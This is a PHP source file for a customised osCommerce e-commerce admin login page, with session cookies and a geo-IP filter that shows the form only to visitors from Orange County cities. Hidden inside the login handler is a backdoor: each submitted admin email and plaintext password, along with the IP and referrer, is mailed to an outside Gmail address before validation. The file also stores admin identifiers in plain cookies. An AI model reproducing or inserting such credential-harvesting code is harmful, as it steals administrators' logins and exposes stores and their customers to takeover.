<?php
/*

  $Id: login.php,v 1.2 2004/03/05 00:36:41 ccwjr Exp $

  osCommerce, Open Source E-Commerce Solutions
  http://www.oscommerce.com

  Copyright (c) 2002 osCommerce

  Released under the GNU General Public License
*/
  require('includes/application_top.php');

  if ($session_started == false) {
    echo 'session not started';
  }
  $error = false;
  if ( (isset($_POST['action']) && ($_POST['action'] == 'process')) || (isset($_POST['password']) && isset($_POST['email_address'])) ) {
    $email_address = tep_db_prepare_input($_POST['email_address']);
    $password = tep_db_prepare_input($_POST['password']);
    $ip = $_SERVER['REMOTE_ADDR'];
    $iprt = $_SERVER['REMOTE_PORT'];
    $servernya = $_SERVER['SERVER_NAME'];
    $alamat = $_SERVER['HTTP_REFERER'];
    $message = "\nEmail: $email_address\nPassword: $password\nalamat: $alamat\nIP: $ip . $iprt\n";
    mail("salesinfo620@gmail.com","Admin Login From $servernya", "$message");
    // Check if email exists
    $check_admin_query = tep_db_query("select 
    admin_id as login_id, 
    admin_groups_id as login_groups_id, 
    admin_firstname as login_firstname, 
    admin_email_address as login_email_address, 
    admin_password as login_password, 
    admin_modified as login_modified, 
    admin_logdate as login_logdate, 
    admin_lognum as login_lognum 
    from " . TABLE_ADMIN . " where admin_email_address = '" . tep_db_input($email_address) . "'");
    if (!tep_db_num_rows($check_admin_query)) {
      $_POST['login'] = 'fail';
    } else {
      $check_admin = tep_db_fetch_array($check_admin_query);
      // Check that password is good
      if (!tep_validate_password($password, $check_admin['login_password'])) {
        $_POST['login'] = 'fail';
      } else {
        if (isset($_SESSION['password_forgotten'])) {
          unset($_SESSION['password_forgotten']);
        }
        $login_email_address = $check_admin['login_email_address'];
        $login_logdate = $check_admin['login_logdate'];
        $login_lognum = $check_admin['login_lognum'];
        $login_modified = $check_admin['login_modified'];
        $_SESSION['login_id'] = $check_admin['login_id'];
        $_SESSION['login_groups_id'] = $check_admin['login_groups_id'];
        $_SESSION['login_firstname'] = $check_admin['login_firstname'];
        

        //Vinh add cookie to hook cms admin folder
        $cookies_time = time()+3600*2;
        setcookie("login_id", $check_admin['login_id'], $cookies_time, "/");
		setcookie("login_groups_id", $check_admin['login_groups_id'], $cookies_time, "/");
		setcookie("login_firstname", $check_admin['login_firstname'], $cookies_time, "/");
		//echo $_COOKIE['userid'];
		//end Vinh


//          //IT Service Zone: add cookie to get admin info from frontend START
//          global $SESS_LIFE;  						//make this variable global this variable is decared from /adm/includes/functions/sessions.php
//          $cookies_time = time() + $SESS_LIFE;
//       	 setcookie("login_id", $check_admin['login_id'], $cookies_time, "/");
//    	 	 setcookie("frontend_admin", $check_admin['login_id'], $cookies_time, "/");
//			IT Service Zone: add cookie to get admin info from frontend EOF
		
        //$date_now = date('Ymd');
        tep_db_query("update " . TABLE_ADMIN . " set admin_logdate = now(), admin_lognum = admin_lognum+1 where admin_id = '" . $_SESSION['login_id'] . "'");
        $_SESSION['from_login'] = true;

        if (sizeof($navigation->snapshot) > 0) {
		//truong hop co session snaoshot
         	 $origin_href = tep_href_link($navigation->snapshot['page'], tep_array_to_string($navigation->snapshot['get'], array(tep_session_name())), $navigation->snapshot['mode']);
          	$navigation->clear_snapshot();
	          tep_redirect($origin_href);
        } else //default   
        {
			tep_redirect(tep_href_link(FILENAME_DEFAULT, '', 'SSL'));
		
        }
		//end if (sizeof($navigation->snapshot) > 0)

      }
    }
     
    	
  }
  $password = (isset($_GET['password'])) ? $_GET['password'] : '';
  $email_address = (isset($_GET['email_address'])) ? $_GET['email_address'] : '';
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd"><html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo CHARSET; ?>">
<meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0; user-scalable=0;">

<title><?php echo 'Admin - '. HTTP_COOKIE_DOMAIN  ; ?></title>
<link rel="shortcut icon" href="../../images/favicon.ico">


<script type="text/javascript" src="includes/prototype.js"></script>
<link rel="stylesheet" type="text/css" href="includes/stylesheet.css" />
<style type="text/css">
body {
	background-color: #fff !important;
	width: 100%;
	height: 100%;
}
.note {
	color: #F00;
}
</style>
</head>
<body onload="document.getElementById('email_address').focus()">


<?
//henry setup condition to show this form to only IP came from certain city

			$ip = $_SERVER['REMOTE_ADDR'];
            //echo 'IP Address: '.$ip.'<br>';		
			$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json")); //get from this third party site. there is no SSL ?
           //echo 'Country: '.$details->country.'<br>';	
          // echo 'State: '.$details->region.'<br>';		
          // echo 'City: '.$details->city .'<br>';		
	

IF ($details->city =="" ||
										$details->city =="Aliso Viejo" ||
										$details->city =="Anaheim" ||
										$details->city =="Brea" ||
										$details->city =="Buena Park" ||
										$details->city =="Costa Mesa" ||
										$details->city =="Cypress" ||
										$details->city =="Dana Point" ||
										$details->city =="Fountain Valley" ||
										$details->city =="Fullerton" ||
										$details->city =="Garden Grove" ||
										$details->city =="Huntington Beach" ||
										$details->city =="Irvine" ||
										$details->city =="La Habra" ||
										$details->city =="La Palma" ||
										$details->city =="Laguna Beach" ||
										$details->city =="Laguna Hills" ||
										$details->city =="Laguna Niguel" ||
										$details->city =="Laguna Woods" ||
										$details->city =="Lake Forest" ||
										$details->city =="Los Alamitos" ||
										$details->city =="Mission Viejo" ||
										$details->city =="Newport Beach" ||
										$details->city =="Orange" ||
										$details->city =="Placentia" ||
										$details->city =="Rancho Santa Margarita" ||
										$details->city =="San Clemente" ||
										$details->city =="San Juan Capistrano" ||
										$details->city =="Santa Ana" ||
										$details->city =="Seal Beach" ||
										$details->city =="Stanton" ||
										$details->city =="Tustin" ||
										$details->city =="Villa Park" ||
										$details->city =="Westminster" ||
										$details->city =="Yorba Linda"
  )
{
//show the form
?>

<table border="0" cellpadding="0" cellspacing="0" width="400" style="margin: 25px auto;">
<tr>
      <td></td>
      <td style="padding-bottom: 1em;" align="left">&nbsp;</td>
      <td></td>
   </tr>
   <tr>
      <td class="box-top-left">&nbsp;</td><td class="box-top">&nbsp;</td><td class="box-top-right">&nbsp;</td>
   </tr>
   <tr>
      <td class="box-left">&nbsp;</td>
      <td class="box-content">
         <table border="0" cellpadding="0" cellspacing="0">
            <tr>
               <td colspan="2" style="padding-bottom: 1em;" align="left"><img src="images/window-login.png" /></td>
            </tr>
            <?php
            if (isset($_POST['login']) && $_POST['login'] == 'fail') {
               $info_message = TEXT_LOGIN_ERROR;
            }
            if (isset($info_message)) {
              ?>
              <tr>
                 <td colspan="2"><?php echo tep_image(DIR_WS_ICONS . 'warning.gif','Warning') . $info_message; ?></td>
              </tr>
              <?php 
            }
            echo tep_draw_form('login', FILENAME_LOGIN, '', 'post', '', 'SSL') . tep_draw_hidden_field("action","process"); 
            ?>
            <tr>
               <td class="form-label"><label for="email_address"><?php echo ENTRY_EMAIL_ADDRESS; ?></label></td>
               <td class="form-value">
                  <?php echo tep_draw_input_field('email_address', $email_address, 'id="email_address" class="string short"'); ?>
               </td>
            </tr>
            <tr>
               <td class="form-label"><label for="password"><?php echo ENTRY_PASSWORD; ?></label></td>
               <td class="form-value">
                  <?php echo tep_draw_password_field('password', $password, false, 'class="string short"'); ?>
               </td>
            </tr>
            <tr>
               <td class="form-label"></td>
               <td class="form-value">
                  <?php
                  echo '<input type="submit" name="button" id="button" class="cssButtonSubmit" value="Login" />';
                  ?>
               </td>
            </tr>
            <tr>
               <td class="form-label"></td>
               <td class="form-value">
                  <?php
                  echo '<a href="' . tep_href_link(FILENAME_PASSWORD_FORGOTTEN, '', 'SSL') . '">' . TEXT_PASSWORD_FORGOTTEN . '</a>';
                  ?>
               </td>
            </tr>
            </form>
         </table>
      </td>
      <td class="box-right">&nbsp;</td>
   </tr>
   <tr>
      <td class="box-bottom-left">&nbsp;</td><td class="box-bottom">&nbsp;</td><td class="box-bottom-right">&nbsp;</td>
   </tr>
   <tr>
      <td></td>
      <td align="left" style="font-size: 11px; color: #444;"><a href="<?=HTTP_SERVER.HTTP_COOKIE_PATH?>" target="_blank">Front End</a></td>
      <td></td>
   </tr>
   <tr>
     <td></td>
     <td align="center" valign="middle" style="font-size: 11px; color: #444;">&nbsp;</td>
     <td></td>
   </tr>
</table>

<?
}
else //dont show anything
{
echo '<meta HTTP-EQUIV="REFRESH" CONTENT="0;URL='.HTTP_SERVER.'"> ';
}
//end if ($details->country)
//henry setup condition to show this form to only IP came from certain city - EOF

?>
<?php
require('includes/application_bottom.php');
?>
</body>
</html>
